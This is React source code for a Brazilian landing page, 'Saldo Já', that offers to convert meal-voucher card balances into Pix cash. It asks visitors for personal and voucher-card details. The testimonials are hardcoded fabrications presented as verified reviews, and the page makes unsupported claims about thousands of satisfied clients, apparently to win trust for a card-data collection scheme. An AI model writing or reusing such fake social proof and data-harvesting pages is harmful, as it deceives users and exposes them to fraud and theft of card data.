      name: "Rafael Costa",
      date: "Há 1 semana",
      avatar: "R",
      text: "Achei que ia ser complicado mas foi surpreendentemente fácil! Em menos de 10 minutos o dinheiro estava na minha conta. Serviço de confiança.",
      rating: 5
    }
  ];

  return (
    <div className="grid md:grid-cols-3 gap-6">
      {reviews.map((r, i) => (
        <Card key={i} className="bg-white border-none shadow-sm hover:shadow-md transition-shadow">
          <CardContent className="p-6">
            <div className="flex items-center gap-3 mb-4">
              <div className="w-10 h-10 rounded-full bg-emerald-100 flex items-center justify-center text-emerald-700 font-bold">
                {r.avatar}
              </div>
              <div>
                <div className="font-bold text-gray-900">{r.name}</div>
                <div className="text-xs text-gray-500">{r.date}</div>
              </div>
            </div>
            <div className="flex gap-1 mb-3">
              {[...Array(r.rating)].map((_, i) => (
                <Star key={i} className="w-4 h-4 fill-emerald-500 text-emerald-500" />
              ))}
            </div>
            <Badge variant="secondary" className="bg-emerald-50 text-emerald-700 border-none mb-3">
              <CheckCircle className="w-3 h-3 mr-1" /> Cliente Saldo Já Aprovada

            </Badge>
            <p className="text-gray-600 text-sm italic leading-relaxed">
              "{r.text}"
            </p>
          </CardContent>
        </Card>
      ))}
    </div>
  );
};

export default function Index() {
  return (
    <div className="min-h-screen bg-[#f8fafc] font-sans text-gray-900 overflow-x-hidden">
      <Helmet>
        <title>Saldo Já - Transforme seu VR em Dinheiro na Conta</title>
        <meta name="description" content="Converta o saldo do seu vale-refeição em dinheiro via Pix de forma rápida e segura. Atendimento para Alelo, Sodexo, VR, Ticket e mais." />
      </Helmet>
      {/* Header */}
      <nav className="sticky top-0 z-50 bg-[#004e32] border-b border-[#004e32]/10">
        <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center">
            <img src={logo} alt="Saldo Já Logo" className="h-12 w-auto object-contain bg-white p-1 rounded-md" />
          </div>
          <div className="hidden md:flex items-center gap-8">
            <a href="#" className="text-sm font-medium text-white/90 hover:text-white transition-colors">Início</a>
            <a href="#como-funciona" className="text-sm font-medium text-white/90 hover:text-white transition-colors">Como Funciona</a>
            <Button className="bg-emerald-500 hover:bg-emerald-600 text-white">Começar Agora</Button>
          </div>
        </div>
      </nav>

      {/* Hero Section */}
      <section className="relative pt-20 pb-8 overflow-hidden">
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[1000px] h-[1000px] bg-emerald-50 rounded-full blur-3xl -z-10 opacity-60" />
        <div className="max-w-7xl mx-auto px-4 text-center">
          <Badge className="mb-6 bg-emerald-100 text-emerald-700 hover:bg-emerald-100 border-none px-4 py-1">
            <Zap className="w-3 h-3 mr-2 fill-emerald-600" /> Rápido, Seguro e Prático
          </Badge>
          <h1 className="text-4xl md:text-6xl font-black text-emerald-950 mb-6 tracking-tight">
            Converta seu Vale-Refeição <br />
            em <span className="text-emerald-700 underline decoration-emerald-200 underline-offset-8">Dinheiro na Conta</span>
          </h1>
          <p className="max-w-2xl mx-auto text-lg text-gray-600 mb-10 leading-relaxed">
            Transforme o saldo do seu cartão benefício em Pix de forma rápida, segura e prática. 
            A liberdade que você precisava para usar seu saldo como quiser com o Saldo Já.
          </p>

          <div className="flex flex-wrap justify-center gap-4 mb-6">
            {[
              { icon: <CheckCircle className="w-4 h-4" />, text: "Aprovação em até 10 minutos" },
              { icon: <Shield className="w-4 h-4" />, text: "100% Seguro" },
              { icon: <Monitor className="w-4 h-4" />, text: "Processo Online" },
              { icon: <Percent className="w-4 h-4" />, text: "Sem taxas ocultas" }
            ].map((item, i) => (
              <div key={i} className="flex items-center gap-2 bg-white px-4 py-2 rounded-full shadow-sm border border-gray-100 text-sm font-medium text-emerald-900">
                <span className="text-emerald-500">{item.icon}</span>
                {item.text}
              </div>
            ))}
          </div>

          <motion.div 
            initial={{ opacity: 0, y: 20 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            className="mt-2 max-w-4xl mx-auto rounded-2xl overflow-hidden shadow-2xl border-4 border-white"
          >
            <img 
              src="/banner.png" 
              alt="Banner Promocional" 

              className="w-full h-auto object-cover"
            />
          </motion.div>
        </div>
      </section>

      {/* Supported Cards Section */}
      <section className="py-16 bg-white">
        <div className="max-w-7xl mx-auto px-4">
          <div className="text-center mb-12">
            <h2 className="text-sm font-bold text-emerald-600 uppercase tracking-widest mb-2">Cartões Aceitos</h2>
            <h3 className="text-3xl font-bold text-emerald-950">Aceitamos as principais bandeiras do mercado</h3>
          </div>
          
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-4 md:gap-6 max-w-4xl mx-auto">
            {[
              { name: "Alelo", img: "https://i.ibb.co/QjMyxmGD/alelo.png" },
              { name: "Sodexo / Pluxee", img: "https://i.ibb.co/zVQDfZgC/pluxee.png" },
              { name: "VR Refeição", img: "https://i.ibb.co/cKQq08Ry/vr.png" },
              { name: "Ticket", img: "https://i.ibb.co/9m6KjnhM/ticket.png" },
              { name: "Ben", img: "https://i.ibb.co/xqvF6t8w/ben.png" },
              { name: "Caju", img: "https://i.ibb.co/kjwtdpG/caju.jpg" },
              { name: "Flash", img: "https://i.ibb.co/ZqR8ktP/fl.png" },
              { name: "Lecard", img: "https://i.ibb.co/JWBZm6hp/le.png" },
              { name: "Green Card", img: "https://i.ibb.co/5WmbjYtf/gree.png" }
            ].map((brand, i) => (
              <motion.div 
                key={i}
                initial={{ opacity: 0, scale: 0.9 }}
                whileInView={{ opacity: 1, scale: 1 }}
                transition={{ delay: i * 0.05 }}
                viewport={{ once: true }}
                className="bg-white rounded-xl p-4 flex items-center justify-center border border-gray-100 shadow-sm hover:shadow-md transition-all duration-300"
              >
                <img 
                  src={brand.img} 
                  alt={brand.name} 
                  className="h-12 md:h-16 w-full object-contain pointer-events-none" 
                />
              </motion.div>
            ))}
          </div>
        </div>
      </section>

      {/* How it Works */}
      <section id="como-funciona" className="bg-emerald-950 py-24 text-white relative">
        <div className="max-w-7xl mx-auto px-4">
          <div className="text-center mb-16">
            <Badge variant="outline" className="mb-4 text-emerald-400 border-emerald-400/30">
              COMO FUNCIONA
            </Badge>
            <h2 className="text-3xl md:text-4xl font-bold mb-4">Seu vale vira Pix em 4 passos simples</h2>
            <p className="text-emerald-200/60">Processo 100% online, rápido e sem burocracia</p>
          </div>

          <div className="grid md:grid-cols-4 gap-8">
            {[
              { 
                step: "1", 
                title: "Cadastro de Usuário", 
                desc: "Preencha seus dados pessoais e dados do cartão vale-refeição.",
                tag: "Dados Pessoais" 
              },
              { 
                step: "2", 
                title: "Solicitação em Análise", 
                desc: "Nossa equipe analisa sua solicitação. Aguarde o e-mail de confirmação.",
                tag: "Até 10 minutos o seu Pix na conta" 
              },
              { 
                step: "3", 
                title: "Verificação", 
                desc: "Saldo Já verifica os dados e aprova sua solicitação.",
                tag: "Seguro" 
              },
              { 
                step: "4", 
                title: "Transferência Pix", 
                desc: "O valor convertido é enviado diretamente para sua chave Pix.",
                tag: "Na sua conta!" 
              }
            ].map((item, i) => (
              <div key={i} className="relative group">
                <div className="bg-emerald-900/40 p-8 rounded-2xl border border-emerald-800 hover:border-emerald-600 transition-colors h-full">
                  <div className="text-5xl font-black text-[#8eb200] mb-6 group-hover:text-[#ccff00] transition-colors">
                    0{item.step}
                  </div>
                  <h3 className="text-xl font-bold mb-3">{item.title}</h3>
                  <p className="text-emerald-100/60 text-sm leading-relaxed mb-6">
                    {item.desc}
                  </p>
                  <Badge className="bg-emerald-500/10 text-emerald-400 border-emerald-500/20">
                    {item.tag}
                  </Badge>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Form Section */}
      <section className="py-24 -mt-12">
        <div className="max-w-7xl mx-auto px-4">
          <div className="text-center mb-12">
            <Badge className="mb-4 bg-emerald-100 text-emerald-700 border-none">SOLICITE SUA CONVERSÃO</Badge>
            <h2 className="text-3xl font-bold text-emerald-950 mb-4">Preencha o formulário para converter</h2>
            <div className="w-16 h-1 bg-emerald-600 mx-auto rounded-full" />
          </div>
          <ConversionForm />
        </div>
      </section>

      {/* Testimonials Section */}
      <section className="py-24 bg-emerald-50/50">
        <div className="max-w-7xl mx-auto px-4">
          <div className="text-center mb-16">
            <Badge className="mb-4 bg-emerald-100 text-emerald-700 border-none">CLIENTES SATISFEITOS</Badge>
            <h2 className="text-3xl font-bold text-emerald-950 mb-4">O que nossos clientes dizem</h2>
            <p className="text-gray-600">Milhares de pessoas já converteram seu vale com segurança e rapidez.</p>
          </div>

          <div className="flex flex-col md:flex-row items-center justify-center gap-12 mb-16">
            <div className="text-center">
              <div className="text-5xl font-black text-emerald-950 mb-2">4.9</div>
              <div className="flex gap-1 justify-center mb-2">
                {[...Array(5)].map((_, i) => <Star key={i} className="w-5 h-5 fill-emerald-500 text-emerald-500" />)}
              </div>
              <div className="text-sm text-gray-500">Nota geral baseada em avaliações</div>
            </div>
            <Separator orientation="vertical" className="hidden md:block h-20 bg-gray-200" />
            <div className="text-center">
              <div className="text-5xl font-black text-emerald-950 mb-2">+2.7k</div>
              <div className="text-sm text-gray-500 uppercase tracking-widest font-bold">Avaliações verificadas</div>
            </div>
          </div>

          <Testimonials />
          
          <div className="text-center mt-12">
            <p className="text-emerald-900 font-medium">
              <strong>+2.400 clientes satisfeitos</strong> já converteram seus vales. Seja o próximo!
            </p>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-[#004e32] border-t border-emerald-900/30 py-16 text-white">
        <div className="max-w-7xl mx-auto px-4 text-center">
          <div className="flex flex-col items-center justify-center gap-2 mb-8">
            <img src={logo} alt="Saldo Já Logo" className="h-16 w-auto object-contain bg-white p-1 rounded-md" />
          </div>
          <p className="text-emerald-100/60 text-sm mb-8">
            Transforme seu vale-refeição em Pix com total segurança e rapidez.
          </p>
          <div className="flex justify-center gap-8 text-sm font-medium text-emerald-100/80 mb-12">
            <a href="#" className="hover:text-white">Início</a>
            <a href="#" className="hover:text-white">Solicitar Conversão</a>
            <a href="#" className="hover:text-white">Privacidade</a>
          </div>
          <div className="text-xs text-emerald-100/40 space-y-2">
            <p>CNPJ: 34.351.180/0001-28</p>
            <p>© 2026 Saldo Já. Todos os direitos reservados.</p>
          </div>
        </div>
      </footer>

    </div>
  );
}
